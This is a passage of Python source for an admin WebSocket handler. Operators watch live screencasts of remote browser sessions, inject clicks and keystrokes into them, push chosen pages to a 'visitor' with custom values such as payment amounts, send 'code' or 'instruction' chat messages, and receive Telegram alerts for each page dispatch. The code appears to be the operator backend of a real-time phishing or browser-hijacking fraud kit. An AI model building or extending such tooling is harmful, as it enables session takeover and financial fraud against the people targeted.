                            session_id = data.get('client_id')
                            if session_id:
                                lpv_record = await get_session_from_server(session_id)
                                browser_session = await session_manager.get_session(session_id)
                                lpv_only = bool(
                                    isinstance(lpv_record, dict)
                                    and lpv_record.get("is_lpv")
                                    and not browser_session
                                )
                                if lpv_only:
                                    await websocket.send_json({
                                        "type": "lpv_selected",
                                        "client_id": session_id,
                                        "message": "LPV client has no browser screencast"
                                    })
                                elif not browser_session:
                                    await websocket.send_json({
                                        "type": "stream_error",
                                        "client_id": session_id,
                                        "error": "Client session not found"
                                    })
                                else:
                                    await admin_stream_manager.subscribe(session_id, websocket)
                                    # CDP screencast replaces old WebRTC/screenshot monitoring
                                    try:
                                        await _admin_screencast_start(session_id)
                                    except Exception as e:
                                        logger.warning(f"[admin-cast] subscribe screencast start failed {session_id}: {e}")

                        elif data.get('type') == 'unsubscribe' and session_manager:
                            session_id = data.get('client_id')
                            if session_id:
                                await admin_stream_manager.unsubscribe(session_id, websocket)
                                # stop screencast if no more subs
                                try:
                                    async with admin_stream_manager.lock:
                                        has_sub = session_id in admin_stream_manager.subscriptions and len(admin_stream_manager.subscriptions[session_id]) > 0
                                    if not has_sub:
                                        await _admin_screencast_stop(session_id)
                                except Exception as e:
                                    logger.debug(f"[admin-cast] unsubscribe stop failed {session_id}: {e}")

                        elif data.get('type') == 'admin_input' and session_manager:
                            # Forward interactive canvas input (click/wheel/key) to the remote browser
                            sid = data.get('client_id')
                            payload = data.get('payload') or data.get('data') or {}
                            if sid and payload:
                                try:
                                    sess = await session_manager.get_session(sid)
                                    if sess:
                                        # handle_input expects dict with type + coords
                                        await sess.handle_input(payload)
                                        # also handle page-level restart if tab changed
                                        await _admin_screencast_restart_if_page_changed(sid)
                                except Exception as e:
                                    logger.debug(f"[admin-input] forward failed {sid}: {e}")

                                                # get_frame removed — CDP screencast is now continuous.
                        # Any legacy client sending get_frame will be ignored.
                        elif data.get('type') == 'get_frame':
                            await websocket.send_json({"type": "frame_error", "error": "get_frame deprecated, use CDP screencast via subscribe"})

                        # ---- LPV (Live Panel Version) ----
                        elif data.get('type') == 'lpv_start':
                            client_id = data.get('client_id')
                            if not client_id:
                                await websocket.send_json({
                                    "type": "lpv_error",
                                    "error": "missing client_id",
                                })
                            else:
                                lpv_store.start_session(client_id)
                                lpv_store.record_event(client_id, "lpv_started", {"admin": "ui"})
                                ok = await _send_to_client(client_id, {"type": "lpv_start"})
                                await websocket.send_json({
                                    "type": "lpv_ack",
                                    "action": "start",
                                    "client_id": client_id,
                                    "delivered": ok,
                                })
                                await _broadcast_lpv_event(client_id, {
                                    "event_type": "lpv_started",
                                    "page_id": None,
                                    "page_name": None,
                                })

                        elif data.get('type') == 'lpv_stop':
                            client_id = data.get('client_id')
                            if not client_id:
                                await websocket.send_json({
                                    "type": "lpv_error",
                                    "error": "missing client_id",
                                })
                            else:
                                lpv_store.stop_session(client_id)
                                lpv_store.record_event(client_id, "lpv_stopped", {})
                                await _send_to_client(client_id, {"type": "lpv_stop"})
                                await websocket.send_json({
                                    "type": "lpv_ack",
                                    "action": "stop",
                                    "client_id": client_id,
                                    "delivered": True,
                                })
                                await _broadcast_lpv_event(client_id, {
                                    "event_type": "lpv_stopped",
                                    "page_id": None,
                                    "page_name": None,
                                })

                        elif data.get('type') == 'chat_send':
                            # Admin -> client live chat. Persisted first so
                            # history survives a client reconnect, then pushed
                            # to the client and echoed to every admin console.
                            client_id = (data.get('client_id') or '').strip()
                            kind = str(data.get('kind') or 'text').strip().lower()
                            if kind not in ('text', 'code', 'instruction'):
                                kind = 'text'
                            body = str(data.get('body') or '').strip()
                            code = str(data.get('code') or '')
                            if not client_id:
                                await websocket.send_json({
                                    "type": "chat_error",
                                    "error": "missing client_id",
                                })
                            elif kind == 'text' and not body:
                                await websocket.send_json({
                                    "type": "chat_error",
                                    "error": "message is empty",
                                })
                            else:
                                try:
                                    row = lpv_store.chat_add(
                                        client_id, 'admin', body=body,
                                        kind=kind, code=code,
                                        identity_key=(
                                            _lpv_identity_for(client_id) or None
                                        ),
                                    )
                                except Exception as exc:
                                    await websocket.send_json({
                                        "type": "chat_error",
                                        "error": str(exc),
                                    })
                                else:
                                    await _broadcast_chat(row)
                                    delivered = await _send_to_client(
                                        client_id, {"type": "chat_message", **row}
                                    )
                                    await websocket.send_json({
                                        "type": "chat_ack",
                                        "client_id": client_id,
                                        "id": row["id"],
                                        "delivered": delivered,
                                    })

                        elif data.get('type') == 'lpv_push_page':
                            client_id = data.get('client_id')
                            page_id = data.get('page_id')
                            if not client_id or not page_id:
                                await websocket.send_json({
                                    "type": "lpv_error",
                                    "error": "missing client_id or page_id",
                                })
                            else:
                                # Same one-page/two-builds rule as the workflow
                                # runner: the target visitor's device decides
                                # which of a paired page's builds ships.
                                page, served_page_id, _push_device = await _page_for_client(
                                    client_id, page_id
                                )
                                if not page:
                                    await websocket.send_json({
                                        "type": "lpv_error",
                                        "error": f"page {page_id} not found",
                                        "client_id": client_id,
                                    })
                                else:
                                    page_id = served_page_id
                                    # Values typed in the panel for this one
                                    # push ("amount = NGN 50,000"). They are
                                    # stored against a token so they apply to
                                    # this visitor's delivery only.
                                    bind_values = _clean_bind_values(data.get("bindings"))
                                    bind_token = (
                                        _bind_token_for(page_id, bind_values)
                                        if bind_values else None
                                    )
                                    page_url = _lpv_page_url(page_id, bind_token)
                                    ok = await _send_to_client(client_id, {
                                        "type": "lpv_show_page",
                                        "page_id": page_id,
                                        "page_url": page_url,
                                        "page_name": page["name"],
                                        "guard": _page_guard(page_id, page),
                                        "actions": _page_actions(page_id, page),
                                    })
                                    if ok:
                                        lpv_store.set_current_page(
                                            client_id, page_id, page["name"]
                                        )
                                        lpv_store.record_event(
                                            client_id,
                                            "page_pushed",
                                            {"page_version": page.get("version", 1)},
                                            page_id=page_id,
                                            page_name=page["name"],
                                        )
                                        await _broadcast_lpv_event(client_id, {
                                            "event_type": "page_pushed",
                                            "page_id": page_id,
                                            "page_name": page["name"],
                                        })
                                        # Telegram: operator manually pushed a page to this client.
                                        if ok:
                                            try:
                                                tg_notify(
                                                    f"<b>OPERATOR PAGE DISPATCH</b>\n\n"
                                                    f"<b>Pushed Page:</b> {_tg_esc(page['name'], 60)}\n"
                                                    f"<b>Target Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
                                                    "notify_lpv_push",
                                                )
                                            except Exception:
                                                pass
                                    await websocket.send_json({
                                        "type": "lpv_ack",
                                        "action": "push_page",
                                        "client_id": client_id,
                                        "page_id": page_id,
                                        "delivered": ok,
                                        "bindings": sorted(bind_values),
                                    })

            except asyncio.TimeoutError:
                # No message received within timeout - connection is idle but still alive
                # Just continue waiting for next message
                continue
            except WebSocketDisconnect:
                logger.debug("Admin disconnected")
                break
            except Exception as e:
                logger.error(f"Admin WebSocket error: {e}")
                break

    finally:
        # Stop any screencasts where this admin was the last subscriber
        try:
            subs_copy = list(_admin_screencast_sessions.keys())
            for sid in subs_copy:
                async with admin_stream_manager.lock:
                    has = sid in admin_stream_manager.subscriptions and len(admin_stream_manager.subscriptions[sid]) > 0
                if not has:
                    try:
                        await _admin_screencast_stop(sid)
                    except Exception:
                        pass
        except Exception:
            pass
        await admin_stream_manager.unregister_admin(websocket)
        admin_ws_connections.discard(websocket)
